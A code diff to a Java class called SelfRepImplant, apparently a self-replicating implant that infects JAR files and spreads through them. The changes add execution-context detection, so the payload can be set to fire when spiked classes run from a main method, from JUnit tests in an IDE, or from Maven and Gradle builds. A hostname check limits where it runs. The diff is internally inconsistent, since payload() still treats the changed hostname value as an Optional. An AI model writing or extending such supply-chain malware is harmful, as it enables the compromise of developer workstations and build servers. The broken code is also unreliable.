@@ -22,6 +22,12 @@ import java.util.logging.Handler;
 import java.util.logging.Logger;
 
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
+    // Labels used by the guessExecutionContext method to avoid using enums (enums shows up as extra classes in the JAR)
+    static final int EXEC_CTX_UNKNOWN = 0;
+    static final int EXEC_CTX_MAIN = 1;
+    static final int EXEC_CTX_IDE = 2;
+    static final int EXEC_CTX_BUILD_TOOL = 3;
+
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = true;
     static volatile int CONF_DELAY_MS = 0;
@@ -58,6 +64,32 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     static volatile String CONF_DOMAIN;
 
     /**
+     * Run the payload when invoked from a main method.
+     * This can be the <code>public static void main(String[] args)</code> of <i>any</i> class.
+     * Set to <i>true</i> if you'd like the payload to run when a spiked Java application runs normally.
+     */
+    static volatile boolean CONF_RUN_FROM_MAIN = true;
+
+    /**
+     * Run the payload when invoked from an Integrated Development Environment.
+     * This is typically the case when a developer runs JUnit tests that uses spiked classes.
+     * The blast radius will typically be the developers' workstation.
+     */
+    static volatile boolean CONF_RUN_FROM_IDE = true;
+
+    /**
+     * Run the payload when invoked from a build tool like Maven or Gradle.
+     * Set this to <i>true</i> if you want the payload to run when infected JARs are used by JUnit tests that are
+     * invoked by Maven or Gradle.
+     * This is not the same thing as when a developer builds and runs it in a typical IDE.
+     * The exception is NetBeans IDE uses Maven for tests, so any developer running tests (that uses spiked classes)
+     * will be miss-identified as running as a build tool.
+     * Also know that it's a common practice to simply run Maven/Gradle builds from within the IDE, too.
+     * There are no guarantees that the execution context is an actual build server like Jenkins et al.
+     */
+    static volatile boolean CONF_RUN_FROM_BUILD_TOOL = true;
+
+    /**
      * The expected hostname of the target.
      * It will not run if the hostname of the machine does not match this value.
      * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
@@ -68,17 +100,40 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     // This one is not so important. Only use it for temp files and such.
     private static final Random rng = new Random(System.currentTimeMillis());
 
+    private final int executionContextIndicator;
+
+    public SelfRepImplant() {
+        this.executionContextIndicator = EXEC_CTX_UNKNOWN;
+    }
+
+    public SelfRepImplant(int executionContextIndicator) {
+        this.executionContextIndicator = executionContextIndicator;
+    }
+
+    public static SelfRepImplant create() {
+        return new SelfRepImplant(guessExecutionContext());
+    }
+
     @SuppressWarnings("unused")
     public static void init() {
-        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
-            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
-                SelfRepImplant implant = new SelfRepImplant();
-                Thread background = new Thread(implant);
-                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
-                background.setUncaughtExceptionHandler(implant);
-                background.start();
-            }
+        if (System.getProperty(CONF_JVM_MARKER_PROP) != null) {
+            return;
         }
+        if (System.setProperty(CONF_JVM_MARKER_PROP, "true") != null) {
+            return;
+        }
+        int execCtx = guessExecutionContext();
+        String hostname = getHostname();
+        if (!shouldExecute(execCtx, hostname)) {
+            System.out.println("[!] Will not execute in this environment!");
+            return;
+        }
+
+        SelfRepImplant implant = new SelfRepImplant(execCtx);
+        Thread background = new Thread(implant);
+        background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
+        background.setUncaughtExceptionHandler(implant);
+        background.start();
     }
 
     @Override
@@ -98,7 +153,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         // Silently ignore (don't throw up error messages on stderr)
     }
 
-    // Make it executable. This is just relevant for the initial detonation. It's not required for further spreading.
+    /**
+     * Make it executable.
+     * This is just relevant for the initial detonation. It's not required for further spreading.
+     * Also note that this main method will run the payload regardless of what CONF_RUN_FROM_MAIN is set to.
+     */
     public static void main(String[] args) {
         if (args.length < 1) {
             System.err.println("Usage: [ --all | <path-to-target-jar> ]");
@@ -132,7 +191,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    public static void payload() {
+    public void payload() {
+        switch (executionContextIndicator) {
+            case EXEC_CTX_UNKNOWN -> System.out.println("[!] Execution context: Unknown.");
+            case EXEC_CTX_MAIN -> System.out.println("[ ] Execution context: A main function.");
+            case EXEC_CTX_IDE -> System.out.println("[ ] Execution context: An IDE.");
+            case EXEC_CTX_BUILD_TOOL -> System.out.println("[ ] Execution context: A build tool.");
+        }
+
         Optional<String> hostname = getHostname();
         if (hostname.isEmpty() || !hostname.get().equals(CONF_TARGET_HOSTNAME)) {
             // Don't accidentally explode somewhere other than the test server
@@ -299,6 +365,60 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             threads.shutdownNow();
             Thread.currentThread().interrupt();
         }
+    }
+
+    static boolean shouldExecute(int execCtx, String hostname) {
+        boolean isDesiredExecutionContext = false;
+        switch (execCtx) {
+            // Avoid using enhanced switch statement to be compatible with as low of a Java version as possible.
+            case EXEC_CTX_MAIN:
+                isDesiredExecutionContext = CONF_RUN_FROM_MAIN;
+                break;
+            case EXEC_CTX_IDE:
+                isDesiredExecutionContext = CONF_RUN_FROM_IDE;
+                break;
+            case EXEC_CTX_BUILD_TOOL:
+                isDesiredExecutionContext = CONF_RUN_FROM_BUILD_TOOL;
+                break;
+        }
+
+        boolean isDesiredHostname = hostname != null && hostname.equals(CONF_TARGET_HOSTNAME);
+
+        return isDesiredExecutionContext && isDesiredHostname;
+    }
+
+    static int guessExecutionContext() {
+        return guessExecutionContext(Thread.currentThread().getStackTrace());
+    }
+
+    static int guessExecutionContext(StackTraceElement[] stackTrace) {
+        boolean foundJunit = false;
+        boolean foundMaven = false;
+        boolean foundGradle = false;
+        // The first two elements are Thread.getStackTrace() and guessExecutionContext()
+        for (int i = 2; i < stackTrace.length; i++) {
+            if (stackTrace[i].getClassName().startsWith("org.junit.")) {
+                foundJunit = true;
+            }
+            if (stackTrace[i].getClassName().startsWith("org.apache.maven.")) {
+                foundMaven = true;
+            }
+            if (stackTrace[i].getClassName().startsWith("org.gradle.")) {
+                foundGradle = true;
+            }
+        }
+
+        if (foundMaven || foundGradle) {
+            return EXEC_CTX_BUILD_TOOL;
+        }
+        if (foundJunit && !foundMaven && !foundGradle) {
+            return EXEC_CTX_IDE;
+        }
+        if (stackTrace[stackTrace.length - 1].getMethodName().equals("main")) {
+            return EXEC_CTX_MAIN;
+        }
+
+        return EXEC_CTX_UNKNOWN;
     }
 
     private static void cleanUpTempFile(Path outputTempFile) {
@@ -538,11 +658,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    private static Optional<String> getHostname() {
+    private static String getHostname() {
         try {
-            return Optional.of(InetAddress.getLocalHost().getHostName());
+            return InetAddress.getLocalHost().getHostName();
         } catch (UnknownHostException ignored) {
-            return Optional.empty();
+            return null;
         }
     }
 
